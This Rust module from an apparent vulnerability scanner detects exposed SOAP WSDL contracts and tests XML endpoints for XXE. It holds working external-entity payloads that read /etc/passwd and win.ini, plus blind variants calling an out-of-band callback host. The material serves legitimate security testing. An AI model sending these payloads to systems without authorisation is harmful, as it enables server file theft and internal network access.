//! XML and SOAP endpoint checks: exposed service contracts, and XXE.
//!
//! The value-injection engine puts payloads into a parameter's value. An XML
//! endpoint has no parameters to speak of: the whole request body is the input,
//! and the interesting bug lives in the parser rather than in a field. So an
//! endpoint that accepts XML needs its own pass, and without one an entire
//! class of enterprise surface (SOAP services, XML-RPC, SAML consumers, legacy
//! `.asmx`/`.svc` endpoints, and any REST API that also accepts
//! `application/xml`) was never tested at all.
//!
//! Two things are checked:
//!
//!   1. A service contract served to anyone. A WSDL enumerates every operation,
//!      its arguments and its types, which is a map of the internal API.
//!   2. XXE. An external entity that the parser resolves is a file read from
//!      the application server, and frequently SSRF into the internal network
//!      on top of it.
//!
//! Nothing here is destructive: no billion-laughs, no entity that writes, and
//! the file read targets `/etc/passwd` and `win.ini`, which are inert.
//!
//! Both are gated on evidence that the endpoint actually speaks XML, because
//! POSTing XML at every discovered endpoint would multiply request volume for
//! nothing on the great majority of targets that speak JSON.

use crate::probe::{self, Resp, is_passwd};
use cfx_finding::Finding;
use serde_json::Value;
use transport::Client;

/// Does this response look like a WSDL / service contract?
fn is_wsdl(r: &Resp) -> bool {
    let b = &r.body;
    (200..300).contains(&r.status)
        && (b.contains("<definitions") || b.contains(":definitions") || b.contains("<wsdl:"))
        && b.contains("soap")
}

/// Does this response look like it came from an XML parser rather than a router
/// rejecting an unknown content type?
fn looks_like_xml(r: &Resp) -> bool {
    let ct = r.header("content-type").unwrap_or("").to_lowercase();
    if ct.contains("xml") {
        return true;
    }
    let b = r.body.trim_start();
    b.starts_with("<?xml") || b.contains("<soap:Envelope") || b.contains(":Envelope")
}

/// A SOAP envelope wrapping `inner`, and the same content bare. Both are tried:
/// a SOAP service rejects a bare document, and a plain XML endpoint often
/// rejects an envelope, and we do not know which one we are talking to.
fn wrap(doctype: &str, inner: &str) -> [(String, &'static str); 2] {
    [
        (
            format!("<?xml version=\"1.0\"?>{doctype}<cfx>{inner}</cfx>"),
            "application/xml",
        ),
        (
            format!(
                "<?xml version=\"1.0\"?>{doctype}\
                 <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\
                 <soap:Body><cfx>{inner}</cfx></soap:Body></soap:Envelope>"
            ),
            "text/xml",
        ),
    ]
}

/// Check one endpoint. `seen` dedupes by URL across the endpoint list, because
/// several operations on one service are one service.
pub async fn probe(
    client: &Client,
    method: &str,
    url: &str,
    oast: Option<&crate::oast::OastClient>,
    seen: &crate::inject::SeenSet,
) -> Vec<Value> {
    let mut out = Vec::new();
    let base = url.split('?').next().unwrap_or(url).to_string();
    if !crate::inject::seen_once(seen, base.clone()) {
        return out;
    }

    // --- 1. Is this an XML endpoint at all? -------------------------------------------------
    // Evidence first: a contract at `?wsdl`, or a response that is itself XML.
    // Only endpoints whose name suggests a service get the extra `?wsdl`
    // request, so a JSON API does not pay for this check.
    let name_hints_service = {
        let low = base.to_lowercase();
        low.ends_with(".asmx")
            || low.ends_with(".svc")
            || low.ends_with(".wsdl")
            || low.contains("/soap")
            || low.contains("/services/")
            || low.contains("/service/")
            || low.contains("/ws-")
            || low.contains("/ws/")
            || low.contains("xmlrpc")
            || url.to_lowercase().contains("wsdl")
    };

    let mut speaks_xml = false;
    if name_hints_service {
        let wsdl_url = format!("{base}?wsdl");
        if let Some(r) = probe::send(client, "GET", &wsdl_url, None).await {
            if is_wsdl(&r) {
                speaks_xml = true;
                out.push(
                    Finding::new(
                        "cortex-xml",
                        "exposure",
                        "SOAP service contract (WSDL) publicly readable",
                        "low",
                        &wsdl_url,
                    )
                    .method("GET")
                    .location("endpoint")
                    .describe(
                        "The endpoint serves its WSDL to an unauthenticated request. A WSDL lists \
                         every operation, argument and type the service accepts, which turns \
                         guesswork about an internal API into a lookup and is the usual first step \
                         before attacking a SOAP service. Serve the contract only to authorised \
                         consumers.",
                    )
                    .build(),
                );
            }
        }
    }

    if !speaks_xml {
        // A minimal well-formed document. A parser answers something; a router
        // that does not accept XML answers 415, or 400 with a JSON error.
        let probe_body = "<?xml version=\"1.0\"?><cfx><a>1</a></cfx>";
        let m = if method.eq_ignore_ascii_case("GET") {
            "POST"
        } else {
            method
        };
        if let Some(r) = probe::send(client, m, &base, Some((probe_body, "application/xml"))).await
        {
            if r.status != 415 && r.status != 405 && looks_like_xml(&r) {
                speaks_xml = true;
            }
        }
    }
    if !speaks_xml {
        return out;
    }

    // --- 2. XXE: an external entity the parser resolves --------------------------------------
    let m = if method.eq_ignore_ascii_case("GET") {
        "POST"
    } else {
        method
    };

    for file in ["file:///etc/passwd", "file:///c:/windows/win.ini"] {
        let doctype = format!("<!DOCTYPE cfx [<!ENTITY cfxe SYSTEM \"{file}\">]>");
        for (body, ct) in wrap(&doctype, "&cfxe;") {
            let Some(r) = probe::send(client, m, &base, Some((&body, ct))).await else {
                continue;
            };
            let leaked = is_passwd(&r.body)
                || r.body.contains("[extensions]")
                || r.body.contains("for 16-bit app support");
            if !leaked {
                continue;
            }
            // Confirm before reporting, same rule as every other oracle here.
            let Some(again) = probe::send(client, m, &base, Some((&body, ct))).await else {
                continue;
            };
            if !(is_passwd(&again.body) || again.body.contains("[extensions]")) {
                continue;
            }
            out.push(
                Finding::new(
                    "cortex-xml",
                    "xxe",
                    "XML external entity (XXE) - local file disclosure",
                    "high",
                    &base,
                )
                .method(m)
                .location("body")
                .describe(format!(
                    "The XML parser resolved an external entity pointing at `{file}` and returned \
                     its contents in the response. The same primitive reads any file the \
                     application user can read, and reaches internal network services through \
                     `http://` entities. Disable external entities and DTD processing in the parser."
                ))
                .build(),
            );
            return out;
        }
    }

    // Blind XXE: the parser resolves the entity but never echoes it back, which
    // is the common case on a service that returns a fixed response shape. Only
    // an out-of-band callback can see it.
    if let Some(oc) = oast {
        if let Some(reg) = oc.register(client).await {
            let host = oc.host(&reg);
            let doctypes = [
                format!("<!DOCTYPE cfx [<!ENTITY cfxe SYSTEM \"http://{host}/x\">]>"),
                // Parameter entity: reaches parsers that refuse a general entity
                // in content but still fetch the external subset.
                format!("<!DOCTYPE cfx [<!ENTITY % cfxp SYSTEM \"http://{host}/p\"> %cfxp;]>"),
            ];
            for dt in &doctypes {
                for (body, ct) in wrap(dt, "&cfxe;") {
                    let _ = probe::send(client, m, &base, Some((&body, ct))).await;
                }
            }
            let mut hits = 0;
            for _ in 0..4 {
                tokio::time::sleep(std::time::Duration::from_millis(700)).await;
                hits = oc.poll(client, &reg).await;
                if hits > 0 {
                    break;
                }
            }
            oc.deregister(client, &reg).await;
            if hits > 0 {
                out.push(
                    Finding::new(
                        "cortex-xml",
                        "xxe",
                        "XML external entity (XXE, blind - out-of-band confirmed)",
                        "high",
                        &base,
                    )
                    .method(m)
                    .location("body")
                    .describe(
                        "The XML parser fetched an external entity from a host we control, so it \
                         resolves attacker-supplied URLs. Nothing is echoed back, so this is blind, \
                         but the same primitive reads local files through an out-of-band channel \
                         and reaches internal services the application server can see. Disable \
                         external entities and DTD processing.",
                    )
                    .build(),
                );
            }
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resp(status: u16, ct: &str, body: &str) -> Resp {
        Resp {
            status,
            body: body.into(),
            elapsed_ms: 0,
            location: None,
            headers: vec![("content-type".into(), ct.into())],
        }
    }

    #[test]
    fn a_wsdl_is_recognised_and_a_web_page_is_not() {
        assert!(is_wsdl(&resp(
            200,
            "text/xml",
            "<definitions xmlns:soap=\"http://schemas.xmlsoap.org/soap/\">"
        )));
        assert!(!is_wsdl(&resp(
            200,
            "text/html",
            "<html>definitions</html>"
        )));
        assert!(!is_wsdl(&resp(
            404,
            "text/xml",
            "<definitions xmlns:soap=\"x\">"
        )));
    }

    #[test]
    fn xml_is_detected_by_type_or_shape() {
        assert!(looks_like_xml(&resp(200, "application/xml", "")));
        assert!(looks_like_xml(&resp(
            200,
            "text/plain",
            "<?xml version=\"1.0\"?><a/>"
        )));
        assert!(!looks_like_xml(&resp(200, "application/json", "{\"a\":1}")));
    }

    #[test]
    fn both_envelope_shapes_are_tried() {
        let w = wrap("<!DOCTYPE a []>", "&e;");
        assert_eq!(w.len(), 2);
        assert!(w[0].0.contains("<cfx>&e;</cfx>"));
        assert!(w[1].0.contains("soap:Envelope"));
        assert!(w.iter().all(|(b, _)| b.starts_with("<?xml")));
    }
}
